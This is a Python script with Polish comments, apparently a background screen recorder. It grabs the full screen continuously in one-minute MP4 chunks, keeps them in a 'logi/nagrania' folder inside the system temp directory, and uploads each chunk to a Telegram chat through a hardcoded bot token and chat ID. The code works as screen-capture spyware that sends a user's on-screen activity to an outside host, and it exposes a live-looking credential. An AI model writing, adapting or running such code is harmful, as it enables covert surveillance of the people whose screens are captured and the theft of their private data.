# recorder_1min_temp_background.py - CIĄGLE NAGRANIA W TLE + WYSYŁKA DO TELEGRAM
import cv2
import numpy as np
from PIL import ImageGrab
import time
import os
import tempfile
from datetime import datetime
import threading
import requests

# ===== KONFIGURACJA TELEGRAM =====
BOT_TOKEN = "8853348229:AAHtWaSI0jZ2tEXDWkYIqSa6ujIk7voQm0E"  # Wpisz swój token od @BotFather
CHAT_ID = "7701250279"      # Wpisz swoje ID (np. od @getidsbot)

def utworz_folder_nagrania():
    """
    Tworzy folder temp/logi/nagrania, jeśli nie istnieje.
    """
    # Pobierz ścieżkę do systemowego folderu temp
    temp_dir = tempfile.gettempdir()
    
    # Ścieżka do folderu logi/nagrania w temp
    folder_path = os.path.join(temp_dir, 'logi', 'nagrania')
    
    # Utwórz folder jeśli nie istnieje
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Utworzono folder: {folder_path}")
    else:
        print(f"Folder już istnieje: {folder_path}")
    
    return folder_path

def wyslij_do_telegramu(sciezka_pliku, wiadomosc=""):
    """
    Wysyła plik do bota na Telegramie.
    """
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        with open(sciezka_pliku, 'rb') as f:
            files = {'document': f}
            data = {
                'chat_id': CHAT_ID,
                'caption': wiadomosc
            }
            
            response = requests.post(url, files=files, data=data, timeout=60)
            
            if response.status_code == 200:
                print(f"✅ Plik wysłany do Telegram: {os.path.basename(sciezka_pliku)}")
                return True
            else:
                print(f"❌ Błąd wysyłki: {response.status_code} - {response.text}")
                return False
                
    except Exception as e:
        print(f"❌ Błąd podczas wysyłania do Telegram: {e}")
        return False

class ContinuousRecorder:
    def __init__(self):
        self.recording = True
        self.fps = 20
        self.duration = 60  # 1 minuta
        
        # TWORZYMY FOLDER W TEMP/LOGI/NAGRANIA
        self.temp_dir = utworz_folder_nagrania()
        
        # Rozdzielczość
        try:
            import win32api, win32con
            self.width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
            self.height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        except:
            self.width, self.height = 1920, 1080
        
        self.screen_size = (self.width, self.height)
        self.file_counter = 0
        self.total_frames = 0
        
        print("="*60)
        print("CIĄGŁA NAGRYYWARKA - 1 MINUTA NA FILM + TELEGRAM")
        print("="*60)
        print(f"Zapis: {self.temp_dir}")
        print(f"Czas na film: {self.duration}s")
        print(f"Rozdzielczość: {self.width}x{self.height}")
        print("\nNagrywanie... Aby zatrzymać: Ctrl+C")
        print("="*60)
    
    def record_part(self):
        """Nagrywa jeden 1-minutowy plik i wysyła do Telegramu"""
        self.file_counter += 1
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"nagranie_{timestamp}_part{self.file_counter:03d}.mp4"
        output_path = os.path.join(self.temp_dir, filename)
        
        print(f"\n▶ Nagrywanie: {filename}")
        
        # Inicjalizacja
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_path, fourcc, self.fps, self.screen_size)
        
        if not out.isOpened():
            print(f"❌ Błąd: {filename}")
            return False
        
        # Nagrywaj
        frame_count = 0
        start_time = time.time()
        
        while time.time() - start_time < self.duration and self.recording:
            # Zrzut ekranu
            screenshot = ImageGrab.grab()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            out.write(frame)
            frame_count += 1
            self.total_frames += 1
            
            # Postęp
            remaining = self.duration - (time.time() - start_time)
            print(f"  ⏱ {remaining:.1f}s | {frame_count} klatek", end='\r')
            
            time.sleep(1.0 / self.fps)
        
        # Zapisz
        out.release()
        
        if os.path.exists(output_path):
            size = os.path.getsize(output_path)
            print(f"\n✅ {filename} ({size/1024/1024:.2f} MB)")
            
            # === WYŚLIJ PLIK DO TELEGRAMU ===
            print(f"📤 Wysyłanie do Telegram...")
            wiadomosc = f"🎥 Nagranie {self.file_counter}\n📁 {filename}\n📏 {size/1024/1024:.2f} MB\n⏱ 60 sekund"
            wyslij_do_telegramu(output_path, wiadomosc)
            
            # Opcjonalnie: USUŃ PLIK PO WYSŁANIU (żeby nie zapełniać dysku)
            # try:
            #     os.remove(output_path)
            #     print(f"🗑️ Plik usunięty z dysku: {filename}")
            # except:
            #     pass
            
            return True
        else:
            print(f"\n❌ Błąd: {filename}")
            return False
    
    def start(self):
        """Rozpoczyna ciągłe nagrywanie"""
        start_time = time.time()
        
        while self.recording:
            if not self.record_part():
                break
            
            # Krótka przerwa między plikami (opcjonalnie)
            # time.sleep(0.5)
        
        # Podsumowanie
        elapsed = time.time() - start_time
        print("\n" + "="*60)
        print("✅ ZAKOŃCZONO!")
        print(f"✅ Plików: {self.file_counter}")
        print(f"✅ Klatek: {self.total_frames}")
        print(f"✅ Czas: {elapsed/60:.1f} minut")
        print(f"✅ Lokalizacja: {self.temp_dir}")
        print("="*60)
        
        try:
            os.startfile(self.temp_dir)
        except:
            pass
    
    def stop(self):
        """Zatrzymuje nagrywanie"""
        self.recording = False

# === URUCHOMIENIE ===
if __name__ == "__main__":
    recorder = ContinuousRecorder()
    
    try:
        recorder.start()
    except KeyboardInterrupt:
        print("\n\n⏹ Zatrzymywanie...")
        recorder.stop()
        time.sleep(1)
    
    input("\nNaciśnij ENTER aby zamknąć...")